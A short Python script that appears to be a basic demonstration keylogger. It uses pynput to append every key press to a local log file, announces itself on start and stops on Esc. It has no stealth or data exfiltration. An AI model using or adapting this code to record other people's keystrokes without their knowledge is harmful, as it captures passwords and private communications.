import os
from pynput.keyboard import Key, Listener

log_dir = "logs"
log_file = os.path.join(log_dir, "keylog.txt")

stop_keylogger = False

def on_press(key):
    global stop_keylogger
    
    try:
        with open(log_file, "a") as f:
            f.write(f"{key} pressed\n")
    except Exception as e:
        print(f"Error: {e}")

    # Check if the Esc key was pressed
    if key == Key.esc:
        stop_keylogger = True
        return False  # Stop the listener

def on_release(key):
    pass

def main():
    global stop_keylogger
    
    if not os.path.exists(log_dir):
        os.makedirs(log_dir)

    print("Keylogger started. Press 'Esc' to stop logging.")

    with Listener(on_press=on_press, on_release=on_release) as listener:
        while not stop_keylogger:
            listener.join()

if __name__ == "__main__":
    main()
